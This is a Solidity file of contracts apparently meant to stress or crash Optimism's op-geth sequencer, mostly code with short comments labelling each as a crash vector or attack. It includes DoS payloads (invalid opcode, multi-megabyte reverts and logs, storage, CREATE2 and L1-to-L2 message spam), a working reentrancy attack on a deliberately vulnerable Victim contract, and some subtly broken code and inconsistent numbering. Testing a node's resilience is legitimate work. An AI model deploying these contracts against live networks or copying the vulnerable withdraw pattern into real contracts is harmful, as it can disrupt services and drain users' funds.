// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// If a smart contract intentionally includes 0xfe to force a sequencer into an unknown state, it could crash an op-geth node.
// Some EVM implementations fail to handle INVALID gracefully.
// Potential Crash Vector: If Optimism’s custom execution engine mishandles INVALID, it could cause a panic or unexpected chain halt.
contract InvalidOpcodeTest {
    constructor() {
        assembly {
            invalid() // 0xfe opcode - should cause a crash or revert
        }
    }
}

// The L2 sequencer must process revert messages when transactions fail.
// A huge payload (hundreds of KBs) might cause out-of-memory (OOM) errors or excessive gas consumption.
// Potential Crash Vector: If op-geth tries to serialize a massive revert payload, it might fail or cause a DoS-like situation.
contract LargeRevertTest {
    constructor() {
        bytes memory largePayload = new bytes(4_000_000); // 4MB revert message
        assembly {
            revert(add(largePayload, 32), 4000000)
        }
    }
}

// Ethereum limits contract call depth to 1024, but excessive recursion could slow down transaction processing.
// If a contract loops without stopping (while(true) { CALL(...) }), it could cause a sequencer stall.
// Potential Crash Vector: Could soft-lock the sequencer by making it process transactions indefinitely.
contract RecursiveCallTest {
    constructor() {
        address(this).call(abi.encodeWithSignature("RecursiveCallTest()")); // Calls itself recursively
    }
}

// SSTORE (0x55) is expensive and if abused (e.g., repeatedly storing and clearing storage), it can choke block processing.
// EXP (0x0a) with large exponents (e.g., 2**256) causes exponential computation, leading to heavy CPU load.
// Potential Crash Vector: If a single transaction overloads op-geth’s computation, it might exceed gas limits and impact block finalization.
contract StorageBombTest {
    mapping(uint256 => uint256) public storageMap;

    constructor() {
        for (uint256 i = 0; i < 1_000; i++) {
            storageMap[i] = i; // Writing to storage repeatedly
        }
    }
}

// Some Optimism nodes may have memory limits, and a large EXTCODECOPY request could cause memory exhaustion.
// If a contract keeps calling EXTCODECOPY in a loop, it might slow down block processing.
// Potential Crash Vector: Memory allocation failure leading to node crash.
contract LargeExtcodecopyTest {
    constructor() {
        address target = 0x0000000000000000000000000000000000000001; // Hardcoded address (modify as needed)
        bytes memory code = new bytes(4_000_000);

        assembly {
            extcodecopy(target, add(code, 32), 0, 4000000)
        }
    }
}

// If a malicious contract deploys thousands of CREATE2 addresses, it might overflow storage tracking mechanisms.
// This can flood state trie updates, affecting the L2 node’s Merkle tree updates.
// Potential Crash Vector: Overloaded state trie sync leading to sequencer desynchronization.
contract Create2SpamTest {
    event ContractDeployed(address addr);

    constructor() {
        for (uint256 i = 0; i < 300; i++) { // Adjust to higher values if needed
            _deploy(i);
        }
    }

    function _deploy(uint256 salt) internal {
        bytes memory bytecode = type(SimpleContract).creationCode;
        address deployed;
        assembly {
            deployed := create2(0, add(bytecode, 32), mload(bytecode), salt)
        }
        emit ContractDeployed(deployed);
    }
}

contract SimpleContract {
    uint256 public value = 42;
}

// Logs need to be stored in Optimism’s data availability layer.
// Massive logs (MBs in size) can slow down transaction inclusion and bloat rollup costs.
// Potential Crash Vector: Event serialization failure or L1 data upload lag.
contract LargeLogTest {
    constructor() {
        bytes memory largeData = new bytes(1_000_000);
        emit LargeData(largeData);
    }

    event LargeData(bytes data);
}

// A contract could spam thousands of SLOAD operations in a loop.
// Could lead to high latency in block execution.
// Potential Crash Vector: Slow block finalization due to excessive state reads.
contract SLoadSpamTest {
    mapping(uint256 => uint256) public storageMap;

    constructor() {
        for (uint256 i = 0; i < 150_000; i++) {
            storageMap[i]; // Repeatedly reading storage
        }
    }
}

// If Optimism’s execution engine doesn’t sanitize contract code properly, it might execute unintended bytecode.
// This could lead to arbitrary EVM crashes.
// Potential Crash Vector: Execution engine crash due to malformed bytecode.
contract OpcodeInjectionTest {
    constructor() {
        bytes memory maliciousCode = hex"600160005401600055"; // Example: `PUSH1 0x01 PUSH1 0x00 SLOAD PUSH1 0x00 SSTORE`

        assembly {
            let ptr := mload(0x40) // Load free memory pointer
            let codeLength := mload(maliciousCode) // Load code length
            mstore(ptr, codeLength) // Store length at memory location
            calldatacopy(add(ptr, 32), maliciousCode, codeLength) // Copy code into memory

            let success := call(gas(), address(), 0, ptr, codeLength, 0, 0)
            if iszero(success) { revert(0, 0) }
        }
    }
}

// Contracts using gas-heavy logic that isn’t optimized for rollups can cause unexpected gas limit failures.
// If the sequencer miscalculates L1<>L2 gas costs, it could reject valid transactions.
// Potential Crash Vector: Sequencer stalls due to gas estimation bugs.
contract GasLimitTest {
    constructor() {
        require(gasleft() > 50_000_000, "Not enough gas!");
    }
}

/**
 * @dev 1️⃣ State Trie Blowup (Massive Storage Writes)
 * - Writes a huge amount of storage values in constructor.
 * - Expected effect: Slow Merkle trie updates, potential sequencer stalls.
 */
contract SstoreSpam {
    constructor() {
        for (uint256 i = 0; i < 1000; i++) {
            assembly {
                sstore(i, i) // Writing large number of values to storage
            }
        }
    }
}

/**
 * @dev 2️⃣ Memory Allocation Attack
 * - Allocates massive memory in constructor.
 * - Expected effect: Out-of-memory (OOM) errors or sequencer stalls.
 */
contract MemoryAllocationTest {
    constructor() {
        assembly {
            let ptr := mload(0x40) // Get free memory pointer
            for { let i := 0 } lt(i, 100000) { i := add(i, 1) } {
                mstore(add(ptr, mul(i, 32)), i) // Large memory writes
            }
        }
    }
}

/**
 * @dev 3️⃣ L1 to L2 Message Overload
 * - Spams L1 to L2 cross-chain messages.
 * - Expected effect: `op-batcher` congestion, latency in L2 message processing.
 */
interface IL1Messenger {
    function sendMessage(address target, bytes calldata message, uint32 gasLimit) external;
}

contract L1ToL2Spam {
    IL1Messenger constant messenger = IL1Messenger(0x4200000000000000000000000000000000000007); // Optimism L1 Messenger

    constructor() {
        for (uint256 i = 0; i < 700; i++) {
            messenger.sendMessage(
                0x4200000000000000000000000000000000000011,
                abi.encodeWithSignature("dummyFunction()"),
                2000000
            );
        }
    }
}

/**
 * @dev 4️⃣ Op-Geth Transaction Pool Spam
 * - Sends many dummy transactions in a loop.
 * - Expected effect: Mempool exhaustion, sequencer delays.
 */
contract TxPoolSpam {
    constructor() {
        for (uint256 i = 0; i < 8000; i++) {
            address target = 0x4200000000000000000000000000000000000001;
            target.call{gas: 100000}(abi.encodeWithSignature("nonexistentFunction()"));
        }
    }
}

/**
 * @dev 5️⃣ Mass CREATE2 Attack
 * - Deploys many contracts via CREATE2.
 * - Expected effect: State trie bloat, sequencer lag.
 */
contract MassCreate2 {
    event ContractCreated(address);

    constructor() {
        for (uint256 i = 0; i < 300; i++) {
            address deployed;
            bytes memory bytecode = type(SimpleContract).creationCode;
            assembly {
                deployed := create2(0, add(bytecode, 32), mload(bytecode), i)
            }
            emit ContractCreated(deployed);
        }
    }
}

/**
 * @dev 6️⃣ Re-Entrancy Attack
 * - Calls a target contract recursively to test reentrancy limits.
 * - Expected effect: If reentrancy is not guarded, may cause sequencer crash.
 */
contract ReentrancyAttack {
    Victim public victim;

    constructor() payable {
        require(msg.value > 0, "Attack contract needs ETH to start!");

        // Deploy the vulnerable Victim contract with ETH
        victim = new Victim{value: msg.value}();

        // Begin the reentrancy attack
        attack();
    }

    function attack() internal {
        victim.withdraw();
    }

    fallback() external payable {
        attack();
    }

    receive() external payable {
        attack();
    }
}

/**
 * @dev ✅ Vulnerable contract that allows reentrancy attacks.
 */
contract Victim {
    mapping(address => uint256) public balances;

    constructor() payable {
        balances[msg.sender] = msg.value;
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];

        // ❌ No reentrancy protection (vulnerable)
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Withdraw failed");

        balances[msg.sender] = 0;
    }

    receive() external payable {}
}

/**
 * @dev 7️⃣ Nonce Reuse Spam
 * - Submits multiple transactions with overlapping nonces.
 * - Expected effect: May cause nonce miscalculation or L2 inconsistencies.
 */
contract NonceReuseTest {
    address public constant TARGET = 0x4200000000000000000000000000000000000001;

    constructor() {
        for (uint256 i = 0; i < 150; i++) {
            sendExternalTransaction();
        }
    }

    function sendExternalTransaction() internal {
        Sender newSender = new Sender();
        newSender.forward(TARGET);
    }
}

/**
 * @dev ✅ Each `Sender` contract is deployed with a fresh nonce and immediately sends a transaction.
 */
contract Sender {
    function forward(address target) public {
        target.call(abi.encodeWithSignature("dummyFunction()"));
        selfdestruct(payable(msg.sender)); // Reset contract storage & avoid state bloat
    }
}


/**
 * @dev 8️⃣ Self-Destruct Test
 * - Executes selfdestruct in constructor.
 * - Expected effect: If selfdestruct is not handled properly, may cause phantom storage issues.
 */
contract SelfDestructTest {
    constructor() {
        selfdestruct(payable(msg.sender));
    }
}





/**
 * @dev 1️⃣ Infinite Stack Bomb (Recursive Calls Depth Attack)
 * - Calls itself infinitely deep until it crashes due to stack overflow.
 */
/**
 * @dev 1️⃣ Infinite Stack Bomb (Recursive Calls Depth Attack)
 * - Deploys a helper contract that recursively calls itself to force stack overflow.
 */
contract InfiniteStackBomb {
    constructor() {
        new RecursiveCaller().startRecursiveCall(0);
    }
}

contract RecursiveCaller {
    function startRecursiveCall(uint256 depth) public {
        if (depth < 1024) { // Max call depth for EVM
            RecursiveCaller(address(this)).startRecursiveCall(depth + 1);
        }
    }
}

/**
 * @dev 2️⃣ Memory Overflow Contract (EVM Heap Exhaustion)
 * - Tries to allocate massive memory beyond the allowed limit.
 */
contract MemoryOverflow {
    constructor() {
        assembly {
            mstore(0xffffffffffffffff, 0xff) // Try to allocate max memory
        }
    }
}

/**
 * @dev 3️⃣ Event Log Flooder (Massive Logs Attack)
 * - Emits an excessive number of log events to stress test batch processing.
 */
contract EventFlooder {
    constructor() {
        for (uint256 i = 0; i < 10000; i++) {
            emit MassiveLog(i);
        }
    }

    event MassiveLog(uint256 index);
}

/**
 * @dev 4️⃣ Self-Destruct Resurrection (State Sync Attack)
 * - Rapidly destroys and redeploys contracts to test L1-L2 sync consistency.
 */
contract SelfDestructResurrector {
    constructor() payable {
        for (uint256 i = 0; i < 100; i++) {
            address newContract = address(new Resurrect());
            Resurrect(newContract).destroy();
            new Resurrect();           
        }
    }
}

contract Resurrect {
    function destroy() public {
        selfdestruct(payable(msg.sender));
    }
}

/**
 * @dev 6️⃣ Extreme Gas Refund Attack
 * - Spams storage writes and deletes to manipulate gas refunds.
 */
contract GasRefundAbuser {
    constructor() {
        for (uint256 i = 0; i < 1000; i++) {
            assembly {
                sstore(i, i)
            }
        }
        selfdestruct(payable(msg.sender));
    }
}

/**
 * @dev 7️⃣ L1-L2 Race Condition Exploit
 * - Sends messages between L1 and L2 to test if they are processed in order.
 */
contract L1L2RaceCondition {
    IL1Messenger constant messenger = IL1Messenger(0x4200000000000000000000000000000000000007);

    constructor() {
        for (uint i = 0; i < 500; i++) {
            messenger.sendMessage(0x4200000000000000000000000000000000000011, abi.encodeWithSignature("testFunction()"), 2000000);
            0x4200000000000000000000000000000000000011.call(abi.encodeWithSignature("testFunction()"));
        }
    }
}

/**
 * @dev 8️⃣ Unstoppable Transaction Loop
 * - Triggers a spam loop of transactions to congest the sequencer.
 */
contract TransactionLoop {
    constructor() {
        for (uint256 i = 0; i < 5000; i++) {
            address(this).call(abi.encodeWithSignature("dummyFunction()"));
        }
    }
}

/**
 * @dev 9️⃣ Malicious `EXTCODESIZE` Query
 * - Calls `EXTCODESIZE` on a non-standard case to test Optimism's storage model.
 */
contract ExtcodeSizeTest {
    constructor() {
        assembly {
            let size := extcodesize(0x0000000000000000000000000000000000000000) // Query non-existent contract
        }
    }
}


/**
 * @dev 11️⃣ Precompile Exploiter
 * - Calls precompile contracts with invalid inputs to stress-test Optimism’s handling.
 */
contract PrecompileExploiter {
    constructor() {
        address precompile = address(0x0000000000000000000000000000000000000001);
        precompile.call("");
    }
}

/**
 * @dev 12️⃣ Calldata Flooder
 * - Sends excessively large calldata payloads to test batch processing.
 */
contract CalldataFlooder {
    constructor() {
        bytes memory largeData = new bytes(1000000); // 1MB of calldata
        emit DataFlood(largeData);
    }

    event DataFlood(bytes data);
}

/**
 * @dev 14️⃣ Looping Self-Destruct Contracts
 * - Creates a chain of contracts that self-destruct into each other.
 */
contract SelfDestructLoop {
    constructor() payable {
        new Destroyer(payable(address(this)));
    }
}

contract Destroyer {
    constructor(address payable target) {
        selfdestruct(target);
    }
}

/**
 * @dev 15️⃣ Maximum Gas Block Filler
 * - Spams the block with max gas-consuming operations.
 */
contract MaxGasBlockFiller {
    constructor() {
        for (uint256 i = 0; i < 1500; i++) {
            assembly {
                sstore(i, i)
                sstore(add(i, 1), i)
            }
        }
    }
}
